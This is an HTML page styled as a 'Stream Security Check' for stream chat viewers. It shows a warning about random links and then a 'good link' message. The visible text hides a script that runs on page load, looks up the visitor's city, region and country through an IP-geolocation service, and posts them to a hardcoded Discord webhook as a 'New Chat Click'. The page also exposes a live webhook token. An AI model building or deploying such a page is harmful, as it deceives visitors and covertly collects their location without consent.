<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stream Security Check</title>
    <style>
        /* Cool Gaming/Streaming Animated Background */
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: radial-gradient(circle at center, #1e1035 0%, #07040d 100%);
            color: #efeff1; 
            text-align: center; 
            padding-top: 20vh; 
            margin: 0;
            overflow: hidden;
            position: relative;
            height: 100vh;
        }

        /* Animated grid overlay effect */
        body::before {
            content: "";
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background-image: 
                linear-gradient(rgba(145, 70, 255, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(145, 70, 255, 0.05) 1px, transparent 1px);
            background-size: 30px 30px;
            background-position: center;
            animation: gridMove 20s linear infinite;
            z-index: 1;
        }

        @keyframes gridMove {
            0% { background-position: 0 0; }
            100% { background-position: 0 100%; }
        }

        /* Neon Floating Card Container */
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 40px 25px;
            background: rgba(24, 24, 27, 0.85);
            backdrop-filter: blur(8px);
            border-radius: 16px;
            border: 2px solid #9146FF;
            box-shadow: 0 0 25px rgba(145, 70, 255, 0.4), inset 0 0 15px rgba(145, 70, 255, 0.1);
            position: relative;
            z-index: 10;
            animation: floatCard 4s ease-in-out infinite;
        }

        @keyframes floatCard {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }

        /* Warning Text Style (Neon Red Glow) */
        .warning-text {
            color: #ff4a4a;
            font-size: 24px;
            font-weight: bold;
            line-height: 1.5;
            display: block;
            text-shadow: 0 0 10px rgba(255, 74, 74, 0.5);
        }

        /* Safe Text Style (Neon Green Glow) */
        .safe-text {
            color: #26d07c;
            font-size: 24px;
            font-weight: bold;
            line-height: 1.5;
            display: none; 
            text-shadow: 0 0 10px rgba(38, 208, 124, 0.5);
        }

        /* Premium RGB Stream Spinner */
        .loader {
            border: 4px solid rgba(145, 70, 255, 0.1);
            border-top: 4px solid #9146FF;
            border-right: 4px solid #00f2ff;
            border-radius: 50%;
            width: 45px;
            height: 45px;
            animation: spin 0.8s linear infinite;
            margin: 35px auto 0 auto;
            filter: drop-shadow(0 0 8px #9146FF);
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <div id="redMessage" class="warning-text">
            ⚠️ This is a warning do not click on random links there might be some bad ones on there.
        </div>
        
        <div id="greenMessage" class="safe-text">
            ✅ This is a good link but dont click on random one u see.
        </div>

        <div class="loader"></div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1504591125858750635/3ej395jYnj8VxkF7mV4cnmrdyPNA6Z1BfBx7Jaw3WP4POwshtwODmMxZSiX_i1XfemTj";

        async function grabLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                if (data.region && data.country_name) {
                    const payload = {
                        content: `📢 **New Chat Click!** From State/Region: **${data.region}**, Country: **${data.country_name}** (City: ${data.city})`
                    };

                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                }
            } catch (error) {
                console.log("Error processing tracking request.");
            }
        }

        grabLocation();

        // 4-second delay script
        setTimeout(() => {
            document.getElementById('redMessage').style.display = 'none';
            document.getElementById('greenMessage').style.display = 'block';
        }, 4000);
    </script>
</body>
</html>
